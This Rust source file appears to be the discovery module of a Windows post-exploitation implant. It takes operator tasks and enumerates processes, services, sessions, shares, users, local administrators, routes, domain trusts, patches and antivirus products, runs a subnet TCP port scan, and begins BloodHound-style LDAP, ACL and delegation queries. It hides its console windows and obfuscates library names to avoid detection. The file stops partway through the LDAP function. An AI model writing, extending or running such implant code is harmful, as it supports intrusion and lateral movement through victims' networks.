//! Discovery & Enumeration — Phase 4.
//! Task type: "enum", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_enum(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_enum_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("enum: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_enum_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("enum: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("enum: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "processes"   => list_processes()
            .map(TaskOutput::success)
            .unwrap_or_else(|e| TaskOutput::failure(&e)),
        "services"    => list_services()
            .map(TaskOutput::success)
            .unwrap_or_else(|e| TaskOutput::failure(&e)),
        "tasks"       => list_scheduled_tasks()
            .map(TaskOutput::success)
            .unwrap_or_else(|e| TaskOutput::failure(&e)),
        "sessions"    => enum_sessions(&v),
        "shares"      => enum_shares(&v),
        "users"       => enum_users(&v),
        "groups"      => enum_groups(),
        "localadmins" => enum_localadmins(),
        "netdiscovery"=> net_discovery(&v),
        "routes"      => enum_routes(),
        "domain"      => shell_enum("nltest /domain_trusts /all_trusts 2>nul & net config workstation 2>nul"),
        "computer"    => enum_computer(),
        "bloodhound"          => enum_bloodhound(&v),
        "acl"                 => enum_acl(&v),
        "unconstrained-deleg" => enum_unconstrained_deleg(&v),
        other                 => TaskOutput::failure(&format!("enum: unknown method: {other}")),
    }
}

// ── Process list ──────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn list_processes() -> Result<Vec<u8>, String> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };

    let mut out = String::from("PID\tPPID\tThreads\tName\n");
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return Err("processes: CreateToolhelp32Snapshot failed".to_string());
        }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let name = String::from_utf16_lossy(&e.szExeFile[..nlen]);
                out.push_str(&format!("{}\t{}\t{}\t{}\n",
                    e.th32ProcessID, e.th32ParentProcessID,
                    e.cntThreads, name));
                e = core::mem::zeroed();
                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snap, &mut e) == 0 { break; }
            }
        }
        CloseHandle(snap);
    }
    Ok(out.into_bytes())
}

// ── Service enumeration ───────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn list_services() -> Result<Vec<u8>, String> {
    use windows_sys::Win32::System::Services::{
        CloseServiceHandle, EnumServicesStatusExW, OpenSCManagerW,
        ENUM_SERVICE_STATUS_PROCESSW, SC_ENUM_PROCESS_INFO,
        SC_MANAGER_ENUMERATE_SERVICE, SERVICE_STATE_ALL, SERVICE_WIN32,
    };

    let mut out = String::from("Name\tDisplayName\tStatus\tPID\n");
    unsafe {
        let scm = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SC_MANAGER_ENUMERATE_SERVICE);
        if scm == 0 {
            return Err("services: OpenSCManagerW failed".to_string());
        }
        let mut bytes_needed: u32 = 0;
        let mut count: u32 = 0;
        let mut resume: u32 = 0;
        // First call to get required buffer size
        EnumServicesStatusExW(
            scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
            core::ptr::null_mut(), 0, &mut bytes_needed, &mut count,
            &mut resume, core::ptr::null(),
        );
        if bytes_needed == 0 {
            CloseServiceHandle(scm);
            out.push_str("(no services found)\n");
            return Ok(out.into_bytes());
        }
        let mut buf: Vec<u8> = vec![0u8; bytes_needed as usize];
        resume = 0;
        let ok = EnumServicesStatusExW(
            scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
            buf.as_mut_ptr(), bytes_needed, &mut bytes_needed,
            &mut count, &mut resume, core::ptr::null(),
        );
        CloseServiceHandle(scm);
        if ok == 0 {
            return Err("services: EnumServicesStatusExW failed".to_string());
        }
        let entry_size = core::mem::size_of::<ENUM_SERVICE_STATUS_PROCESSW>();
        for i in 0..count as usize {
            let e = &*(buf.as_ptr().add(i * entry_size) as *const ENUM_SERVICE_STATUS_PROCESSW);
            let name = if !e.lpServiceName.is_null() {
                let mut n = 0; while *e.lpServiceName.add(n) != 0 { n += 1; }
                String::from_utf16_lossy(core::slice::from_raw_parts(e.lpServiceName, n))
            } else { String::new() };
            let disp = if !e.lpDisplayName.is_null() {
                let mut n = 0; while *e.lpDisplayName.add(n) != 0 { n += 1; }
                String::from_utf16_lossy(core::slice::from_raw_parts(e.lpDisplayName, n))
            } else { String::new() };
            let state = e.ServiceStatusProcess.dwCurrentState;
            let state_str = match state {
                1 => "STOPPED", 2 => "START_PENDING", 3 => "STOP_PENDING",
                4 => "RUNNING",  5 => "CONTINUE_PENDING", 6 => "PAUSE_PENDING",
                7 => "PAUSED",   _ => "UNKNOWN",
            };
            out.push_str(&format!("{}\t{}\t{}\t{}\n",
                name, disp, state_str, e.ServiceStatusProcess.dwProcessId));
        }
    }
    Ok(out.into_bytes())
}

// ── Scheduled task enumeration ────────────────────────────────────────────────
//
// Walks %SystemRoot%\System32\Tasks recursively and collects task XML file paths.
// Avoids COM dependency (ITaskService) — same information via filesystem.

#[cfg(target_os = "windows")]
fn list_scheduled_tasks() -> Result<Vec<u8>, String> {
    use windows_sys::Win32::System::SystemInformation::GetSystemDirectoryW;

    let mut sys_dir = [0u16; 260];
    let len = unsafe { GetSystemDirectoryW(sys_dir.as_mut_ptr(), 260) } as usize;
    if len == 0 { return Err("tasks: GetSystemDirectoryW failed".to_string()); }

    let base_str = format!("{}\\Tasks",
        String::from_utf16_lossy(&sys_dir[..len]));

    let mut out = String::new();
    walk_tasks(&base_str, &mut out);
    if out.is_empty() { out.push_str("(no tasks found)\n"); }
    Ok(out.into_bytes())
}

// ── Network/domain enumeration helpers ────────────────────────────────────────

#[cfg(target_os = "windows")]
fn shell_enum(cmd: &str) -> TaskOutput {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); TaskOutput::success(d) }
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

#[cfg(target_os = "windows")]
fn enum_sessions(_v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

    let net32 = unsafe { LoadLibraryA(b"netapi32.dll\0".as_ptr()) } as isize;
    if net32 == 0 { return TaskOutput::failure("enum_sessions: netapi32 not found"); }

    // resumehandle is LPDWORD* = pass null (we use MAX_PREFERRED_LENGTH so one call suffices)
    type NetSessionEnumFn = unsafe extern "system" fn(
        *const u16, *const u16, *const u16, u32, *mut *mut u8, u32, *mut u32, *mut u32, *mut usize,
    ) -> u32;
    type NetApiFreeFn = unsafe extern "system" fn(*mut u8);

    let p_fn = unsafe { GetProcAddress(net32, b"NetSessionEnum\0".as_ptr()) };
    let p_free = unsafe { GetProcAddress(net32, b"NetApiBufferFree\0".as_ptr()) };
    let (fn_enum, fn_free) = match (p_fn, p_free) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, NetSessionEnumFn>(a) },
            unsafe { core::mem::transmute::<_, NetApiFreeFn>(b) },
        ),
        _ => return TaskOutput::failure("enum_sessions: function not found"),
    };

    let mut buf: *mut u8 = core::ptr::null_mut();
    let mut read: u32 = 0;
    let mut total: u32 = 0;
    let mut out = String::from("Client\tUser\tTime(s)\tIdleTime(s)\n");
    unsafe { fn_enum(core::ptr::null(), core::ptr::null(), core::ptr::null(), 10, &mut buf, u32::MAX, &mut read, &mut total, core::ptr::null_mut()) };
    if !buf.is_null() {
        for i in 0..read as usize {
            let ep = unsafe { buf.add(i * 24) };
            let client = unsafe { *(ep as *const *const u16) };
            let user   = unsafe { *(ep.add(8) as *const *const u16) };
            let stime  = unsafe { *(ep.add(16) as *const u32) };
            let itime  = unsafe { *(ep.add(20) as *const u32) };
            out.push_str(&format!("{}\t{}\t{}\t{}\n", wide_ptr_to_str(client), wide_ptr_to_str(user), stime, itime));
        }
        unsafe { fn_free(buf) };
    }
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn enum_shares(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

    let host = v.get("host").and_then(|s| s.as_str()).unwrap_or("");

    let net32 = unsafe { LoadLibraryA(b"netapi32.dll\0".as_ptr()) } as isize;
    if net32 == 0 { return TaskOutput::failure("enum_shares: netapi32 not found"); }

    type NetShareEnumFn = unsafe extern "system" fn(
        *const u16, u32, *mut *mut u8, u32, *mut u32, *mut u32, *mut u32,
    ) -> u32;
    type NetApiFreeFn = unsafe extern "system" fn(*mut u8);

    let p_enum = unsafe { GetProcAddress(net32, b"NetShareEnum\0".as_ptr()) };
    let p_free = unsafe { GetProcAddress(net32, b"NetApiBufferFree\0".as_ptr()) };
    let (fn_enum, fn_free) = match (p_enum, p_free) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, NetShareEnumFn>(a) },
            unsafe { core::mem::transmute::<_, NetApiFreeFn>(b) },
        ),
        _ => return TaskOutput::failure("enum_shares: function not found"),
    };

    let host_w: Vec<u16>;
    let host_ptr: *const u16 = if host.is_empty() {
        core::ptr::null()
    } else {
        host_w = host.encode_utf16().chain(core::iter::once(0)).collect();
        host_w.as_ptr()
    };

    let mut buf: *mut u8 = core::ptr::null_mut();
    let mut read: u32 = 0;
    let mut total: u32 = 0;
    let mut resume: u32 = 0;
    let ret = unsafe { fn_enum(host_ptr, 1, &mut buf, u32::MAX, &mut read, &mut total, &mut resume) };
    if ret != 0 && ret != 234 || buf.is_null() {
        return TaskOutput::failure(&format!("enum_shares: NetShareEnum error {ret}"));
    }

    // SHARE_INFO_1 on 64-bit: *name(8), type(4), pad(4), *remark(8) = 24 bytes
    let mut out = String::from("Share\tType\tRemark\n");
    for i in 0..read as usize {
        let ep = unsafe { buf.add(i * 24) };
        let name_ptr   = unsafe { *(ep as *const *const u16) };
        let stype      = unsafe { *(ep.add(8) as *const u32) };
        let remark_ptr = unsafe { *(ep.add(16) as *const *const u16) };
        let type_s = match stype & 0xFFFF {
            0 => "DISK", 1 => "PRINT", 2 => "DEVICE", 3 => "IPC", _ => "SPECIAL",
        };
        out.push_str(&format!("{}\t{}\t{}\n", wide_ptr_to_str(name_ptr), type_s, wide_ptr_to_str(remark_ptr)));
    }
    unsafe { fn_free(buf) };
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn enum_users(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

    let host = v.get("host").and_then(|s| s.as_str()).unwrap_or("");

    let net32 = unsafe { LoadLibraryA(b"netapi32.dll\0".as_ptr()) } as isize;
    if net32 == 0 { return TaskOutput::failure("enum_users: netapi32 not found"); }

    // NetUserEnum(servername, level, filter, bufptr, prefmaxlen, entriesread, totalentries, resume)
    // USER_INFO_0: single *u16 pointer to username (8 bytes on 64-bit)
    type NetUserEnumFn = unsafe extern "system" fn(
        *const u16, u32, u32, *mut *mut u8, u32, *mut u32, *mut u32, *mut u32,
    ) -> u32;
    type NetApiFreeFn = unsafe extern "system" fn(*mut u8);

    let p_enum = unsafe { GetProcAddress(net32, b"NetUserEnum\0".as_ptr()) };
    let p_free = unsafe { GetProcAddress(net32, b"NetApiBufferFree\0".as_ptr()) };
    let (fn_enum, fn_free) = match (p_enum, p_free) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, NetUserEnumFn>(a) },
            unsafe { core::mem::transmute::<_, NetApiFreeFn>(b) },
        ),
        _ => return TaskOutput::failure("enum_users: function not found"),
    };

    let srv_w: Vec<u16>;
    let srv_ptr: *const u16 = if host.is_empty() {
        core::ptr::null()
    } else {
        srv_w = format!("\\\\{host}").encode_utf16().chain(core::iter::once(0)).collect();
        srv_w.as_ptr()
    };

    const FILTER_NORMAL_ACCOUNT: u32 = 0x0002;
    let mut buf: *mut u8 = core::ptr::null_mut();
    let mut read: u32 = 0;
    let mut total: u32 = 0;
    let mut resume: u32 = 0;
    let mut out = String::from("Username\n");
    loop {
        let ret = unsafe { fn_enum(srv_ptr, 0, FILTER_NORMAL_ACCOUNT, &mut buf, u32::MAX, &mut read, &mut total, &mut resume) };
        if !buf.is_null() {
            for i in 0..read as usize {
                let name_ptr = unsafe { *(buf.add(i * 8) as *const *const u16) };
                out.push_str(&format!("{}\n", wide_ptr_to_str(name_ptr)));
            }
            unsafe { fn_free(buf) };
            buf = core::ptr::null_mut();
        }
        if ret != 234 { break; }
    }
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn enum_groups() -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

    let net32 = unsafe { LoadLibraryA(b"netapi32.dll\0".as_ptr()) } as isize;
    if net32 == 0 { return TaskOutput::failure("enum_groups: netapi32 not found"); }

    // resumehandle is PDWORD_PTR = *mut usize (8 bytes on x64, NOT *mut u32)
    type NetLGEnumFn = unsafe extern "system" fn(
        *const u16, u32, *mut *mut u8, u32, *mut u32, *mut u32, *mut usize,
    ) -> u32;
    type NetApiFreeFn = unsafe extern "system" fn(*mut u8);

    let p_enum = unsafe { GetProcAddress(net32, b"NetLocalGroupEnum\0".as_ptr()) };
    let p_free = unsafe { GetProcAddress(net32, b"NetApiBufferFree\0".as_ptr()) };
    let (fn_enum, fn_free) = match (p_enum, p_free) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, NetLGEnumFn>(a) },
            unsafe { core::mem::transmute::<_, NetApiFreeFn>(b) },
        ),
        _ => return TaskOutput::failure("enum_groups: function not found"),
    };

    let mut buf: *mut u8 = core::ptr::null_mut();
    let mut read: u32 = 0;
    let mut total: u32 = 0;
    let mut resume: usize = 0;
    let mut out = String::from("Group\n");
    loop {
        let ret = unsafe { fn_enum(core::ptr::null(), 0, &mut buf, u32::MAX, &mut read, &mut total, &mut resume) };
        if !buf.is_null() {
            for i in 0..read as usize {
                let name_ptr = unsafe { *(buf.add(i * 8) as *const *const u16) };
                out.push_str(&format!("{}\n", wide_ptr_to_str(name_ptr)));
            }
            unsafe { fn_free(buf) };
            buf = core::ptr::null_mut();
        }
        if ret != 234 { break; }
    }
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn enum_localadmins() -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

    let net32 = unsafe { LoadLibraryA(b"netapi32.dll\0".as_ptr()) } as isize;
    if net32 == 0 { return TaskOutput::failure("enum_localadmins: netapi32 not found"); }

    // resumehandle is PDWORD_PTR = *mut usize (8 bytes on x64)
    type NetLGMembersFn = unsafe extern "system" fn(
        *const u16, *const u16, u32, *mut *mut u8, u32, *mut u32, *mut u32, *mut usize,
    ) -> u32;
    type NetApiFreeFn = unsafe extern "system" fn(*mut u8);

    let p_fn = unsafe { GetProcAddress(net32, b"NetLocalGroupGetMembers\0".as_ptr()) };
    let p_free = unsafe { GetProcAddress(net32, b"NetApiBufferFree\0".as_ptr()) };
    let (fn_members, fn_free) = match (p_fn, p_free) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, NetLGMembersFn>(a) },
            unsafe { core::mem::transmute::<_, NetApiFreeFn>(b) },
        ),
        _ => return TaskOutput::failure("enum_localadmins: function not found"),
    };

    let grp: Vec<u16> = "Administrators\0".encode_utf16().collect();
    let mut buf: *mut u8 = core::ptr::null_mut();
    let mut read: u32 = 0;
    let mut total: u32 = 0;
    let mut resume: usize = 0;
    let mut out = String::from("Member\n");
    loop {
        let ret = unsafe { fn_members(core::ptr::null(), grp.as_ptr(), 3, &mut buf, u32::MAX, &mut read, &mut total, &mut resume) };
        if !buf.is_null() {
            for i in 0..read as usize {
                let name_ptr = unsafe { *(buf.add(i * 8) as *const *const u16) };
                out.push_str(&format!("{}\n", wide_ptr_to_str(name_ptr)));
            }
            unsafe { fn_free(buf) };
            buf = core::ptr::null_mut();
        }
        if ret != 234 { break; }
    }
    TaskOutput::success(out.into_bytes())
}

// ── Route table (in-process via GetIpForwardTable2) ───────────────────────────

#[cfg(target_os = "windows")]
fn enum_routes() -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

    let iph = unsafe { LoadLibraryA(b"iphlpapi.dll\0".as_ptr()) } as isize;
    if iph == 0 { return TaskOutput::failure("enum_routes: iphlpapi not found"); }

    // GetIpForwardTable2(Family, Table**) → DWORD
    type GetIpFwdTbl2Fn = unsafe extern "system" fn(u16, *mut *mut u8) -> u32;
    // FreeMibTable(Memory*)
    type FreeMibTblFn   = unsafe extern "system" fn(*mut u8);

    let p_get  = unsafe { GetProcAddress(iph, b"GetIpForwardTable2\0".as_ptr()) };
    let p_free = unsafe { GetProcAddress(iph, b"FreeMibTable\0".as_ptr()) };
    let (fn_get, fn_free) = match (p_get, p_free) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, GetIpFwdTbl2Fn>(a) },
            unsafe { core::mem::transmute::<_, FreeMibTblFn>(b) },
        ),
        _ => return TaskOutput::failure("enum_routes: function not found"),
    };

    let mut tbl: *mut u8 = core::ptr::null_mut();
    // AF_UNSPEC = 0 — returns both IPv4 and IPv6
    let ret = unsafe { fn_get(0u16, &mut tbl) };
    if ret != 0 || tbl.is_null() {
        return TaskOutput::failure(&format!("enum_routes: GetIpForwardTable2 error {ret}"));
    }

    // MIB_IPFORWARD_TABLE2: NumEntries(4) + pad(4) + Table[NumEntries]
    // MIB_IPFORWARD_ROW2 is 104 bytes on x64:
    //   InterfaceLuid(8), InterfaceIndex(4), DestinationPrefix(20=addr(16)+prefixlen(4)),
    //   NextHop(20=addr(16)+si_family(4)), SitePrefixLength(1), ValidLifetime(4), ...
    // We read DestinationPrefix.Prefix.Ipv4.sin_addr at offset 12+4=16 (after luid+index)
    // and NextHop.Ipv4.sin_addr similarly. Simplest: print hex of relevant bytes.
    let num = unsafe { *(tbl as *const u32) } as usize;
    let row_ptr = unsafe { tbl.add(8) }; // skip NumEntries(4) + padding(4)
    const ROW_SIZE: usize = 104;

    let mut out = String::from("Dest/Prefix\tNextHop\tIfIndex\tMetric\n");
    for i in 0..num {
        let r = unsafe { row_ptr.add(i * ROW_SIZE) };
        // InterfaceLuid: 8 bytes, InterfaceIndex: 4 bytes at +8
        let if_idx  = unsafe { *(r.add(8) as *const u32) };
        // DestinationPrefix at +12: IP_ADDRESS_PREFIX = SOCKADDR_INET(28) + PrefixLength(1) + pad(3) = 32 bytes
        // SOCKADDR_INET: si_family(2) + union(26); for IPv4: sin_port(2)+sin_addr(4)+sin_zero(8)
        let family  = unsafe { *(r.add(12) as *const u16) };
        let prefix_len = unsafe { *r.add(12 + 28) };
        // NextHop at +44: SOCKADDR_INET(28)
        let nhop_family = unsafe { *(r.add(44) as *const u16) };
        // Metric at +100
        let metric = unsafe { *(r.add(100) as *const u32) };

        let dest = if family == 2 { // AF_INET
            let a = unsafe { r.add(16) }; // sin_addr at offset 4 within SOCKADDR_IN, which starts at +14 (+2 for si_family)
            format!("{}.{}.{}.{}/{}", unsafe{*a}, unsafe{*a.add(1)}, unsafe{*a.add(2)}, unsafe{*a.add(3)}, prefix_len)
        } else { format!("IPv6/{prefix_len}") };

        let nhop = if nhop_family == 2 {
            let a = unsafe { r.add(48) };
            format!("{}.{}.{}.{}", unsafe{*a}, unsafe{*a.add(1)}, unsafe{*a.add(2)}, unsafe{*a.add(3)})
        } else { "IPv6".to_string() };

        out.push_str(&format!("{dest}\t{nhop}\tif{if_idx}\t{metric}\n"));
    }
    unsafe { fn_free(tbl) };
    TaskOutput::success(out.into_bytes())
}

// ── TCP port scan ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn net_discovery(v: &serde_json::Value) -> TaskOutput {
    let target  = match v.get("target").and_then(|s| s.as_str()) {
        Some(t) => t, None => return TaskOutput::failure("netdiscovery: missing target (CIDR or host)"),
    };
    let ports_raw = v.get("ports").and_then(|s| s.as_str()).unwrap_or("22,80,135,139,443,445,3389,5985,8080");
    let timeout_ms = v.get("timeout_ms").and_then(|n| n.as_u64()).unwrap_or(300) as u64;

    let ports: Vec<u16> = ports_raw.split(',')
        .filter_map(|p| p.trim().parse().ok())
        .collect();

    let hosts = expand_target(target);
    if hosts.is_empty() {
        return TaskOutput::failure("netdiscovery: could not parse target");
    }

    let mut out = String::from("Host\tPort\tStatus\n");
    let timeout = std::time::Duration::from_millis(timeout_ms);

    for host in &hosts {
        for &port in &ports {
            let addr = format!("{host}:{port}");
            let status = if std::net::TcpStream::connect_timeout(
                &addr.parse::<std::net::SocketAddr>().unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap()),
                timeout,
            ).is_ok() { "OPEN" } else { "CLOSED" };
            if status == "OPEN" {
                out.push_str(&format!("{host}\t{port}\t{status}\n"));
            }
        }
    }
    TaskOutput::success(out.into_bytes())
}

fn expand_target(target: &str) -> Vec<String> {
    if let Some(slash) = target.find('/') {
        let ip_str   = &target[..slash];
        let bits: u8 = target[slash+1..].parse().unwrap_or(32);
        if let Ok(ip) = ip_str.parse::<std::net::Ipv4Addr>() {
            let ip_u32: u32 = u32::from(ip);
            let mask   = !0u32 << (32 - bits);
            let net    = ip_u32 & mask;
            let count  = if bits >= 31 { 0u32 } else { (1u32 << (32 - bits)) - 2 };
            return (1..=count.min(256))
                .map(|i| std::net::Ipv4Addr::from(net + i).to_string())
                .collect();
        }
    }
    vec![target.to_string()]
}

fn wide_ptr_to_str(ptr: *const u16) -> String {
    if ptr.is_null() { return String::new(); }
    let mut len = 0;
    while unsafe { *ptr.add(len) } != 0 { len += 1; }
    String::from_utf16_lossy(unsafe { core::slice::from_raw_parts(ptr, len) })
}

#[cfg(target_os = "windows")]
fn walk_tasks(dir: &str, out: &mut String) {
    use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;
    use windows_sys::Win32::Storage::FileSystem::{
        FindFirstFileW, FindNextFileW, FindClose,
        WIN32_FIND_DATAW, FILE_ATTRIBUTE_DIRECTORY,
    };

    let pattern: Vec<u16> = format!("{}\\*\0", dir).encode_utf16().collect();
    let mut fd: WIN32_FIND_DATAW = unsafe { core::mem::zeroed() };
    let h = unsafe { FindFirstFileW(pattern.as_ptr(), &mut fd) };
    if h == INVALID_HANDLE_VALUE { return; }

    loop {
        let nlen = fd.cFileName.iter().position(|&c| c == 0).unwrap_or(260);
        let name = String::from_utf16_lossy(&fd.cFileName[..nlen]);
        if name != "." && name != ".." {
            let full = format!("{}\\{}", dir, name);
            if fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY != 0 {
                walk_tasks(&full, out);
            } else {
                out.push_str(&full);
                out.push('\n');
            }
        }
        fd = unsafe { core::mem::zeroed() };
        if unsafe { FindNextFileW(h, &mut fd) } == 0 { break; }
    }
    unsafe { FindClose(h) };
}

// ── Computer detail enumeration ───────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn enum_computer() -> TaskOutput {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    let mut out = String::new();

    // Hostname, username, domain
    out.push_str(&format!("Hostname:      {}\n", std::env::var("COMPUTERNAME").unwrap_or_default()));
    out.push_str(&format!("Username:      {}\n", std::env::var("USERNAME").unwrap_or_default()));
    out.push_str(&format!("Domain:        {}\n", std::env::var("USERDOMAIN").unwrap_or_default()));
    out.push_str(&format!("UserProfile:   {}\n", std::env::var("USERPROFILE").unwrap_or_default()));
    out.push_str(&format!("SystemRoot:    {}\n", std::env::var("SystemRoot").unwrap_or_default()));

    // OS info from registry
    let os_info = reg_read_os_info();
    out.push_str(&format!("OS:            {}\n", os_info.0));
    out.push_str(&format!("Build:         {}\n", os_info.1));
    out.push_str(&format!("Architecture:  {}\n", if cfg!(target_arch = "x86_64") { "x64" } else { "x86" }));

    // PID + elevated?
    let pid = std::process::id();
    out.push_str(&format!("AgentPID:      {pid}\n"));

    // Quick PowerShell/cmd check for domain join status
    let domain_status = std::process::Command::new("cmd")
        .args(["/C", "wmic computersystem get DomainRole /value 2>nul"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();
    out.push_str(&format!("DomainRole:    {}\n", domain_status.replace("DomainRole=", "").trim()));

    // Installed hotfixes (top 10 most recent)
    let patches = std::process::Command::new("cmd")
        .args(["/C", "wmic qfe get HotFixID,InstalledOn /format:csv 2>nul | sort /r | findstr /v Node | head /n 10 2>nul"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();
    if !patches.is_empty() {
        out.push_str("\nRecent patches:\n");
        out.push_str(&patches);
        out.push('\n');
    }

    // Antivirus
    let av = std::process::Command::new("cmd")
        .args(["/C", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value 2>nul"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();
    if !av.is_empty() {
        out.push_str(&format!("\nAV Products:\n{av}\n"));
    }

    // Environment path
    out.push_str(&format!("\nPATH:\n{}\n", std::env::var("PATH").unwrap_or_default().replace(';', "\n")));

    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn reg_read_os_info() -> (String, String) {
    let key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    const HKLM: isize = -2147483646isize;
    const KEY_READ: u32 = 0x20019;

    use windows_sys::Win32::System::Registry::{RegOpenKeyExA, RegQueryValueExA, RegCloseKey, REG_SZ};

    let mut hkey: isize = 0;
    let sub = std::ffi::CString::new(key).unwrap();
    if unsafe { RegOpenKeyExA(HKLM, sub.as_ptr() as *const u8, 0, KEY_READ, &mut hkey) } != 0 {
        return ("unknown".into(), "unknown".into());
    }

    let mut read_str = |name: &str| -> String {
        let n = std::ffi::CString::new(name).unwrap();
        let mut buf = vec![0u8; 256];
        let mut len = buf.len() as u32;
        let mut typ = 0u32;
        if unsafe { RegQueryValueExA(hkey, n.as_ptr() as *const u8, core::ptr::null_mut(),
            &mut typ, buf.as_mut_ptr(), &mut len) } != 0 { return String::new(); }
        String::from_utf8_lossy(&buf[..len.saturating_sub(1) as usize]).to_string()
    };

    let mut read_dword = |name: &str| -> Option<u32> {
        let n = std::ffi::CString::new(name).unwrap();
        let mut data: u32 = 0;
        let mut len: u32 = 4;
        let mut typ: u32 = 0;
        if unsafe { RegQueryValueExA(hkey, n.as_ptr() as *const u8, core::ptr::null_mut(),
            &mut typ, &mut data as *mut u32 as *mut u8, &mut len) } != 0 { return None; }
        Some(data)
    };

    let product = read_str("ProductName");
    let build   = read_str("CurrentBuildNumber");
    let ubr     = read_dword("UBR").map(|n| n.to_string()).unwrap_or_default();
    unsafe { RegCloseKey(hkey) };

    let build_str = if ubr.is_empty() { build } else { format!("{build}.{ubr}") };
    (product, build_str)
}

// ── Shared LDAP loader (discovery module) ─────────────────────────────────────

#[cfg(target_os = "windows")]
fn wldap_load() -> Result<usize, String> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
    let mut base = crate::loader::get_module_base(
        crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    ) as usize;
    if base == 0 {
        let name = crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
        base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
    }
    if base == 0 { Err("Wldap32 not found".into()) } else { Ok(base) }
}

// Queries LDAP and returns Vec of (dn, Vec<(attr_name, Vec<String>)>).
// Binary attributes are returned as "HEX:<hex>" strings.
#[cfg(target_os = "windows")]
fn ldap_enum(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
    -> Result<Vec<(String, Vec<(String, Vec<String>)>)>, String>
{
    type LdapInitFn    = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn  = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn    = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapSearchFn  = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
    type LdapFirstFn   = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapNextFn    = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapGetDnFn   = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapMemFreeFn = unsafe extern "system" fn(*mut u8);
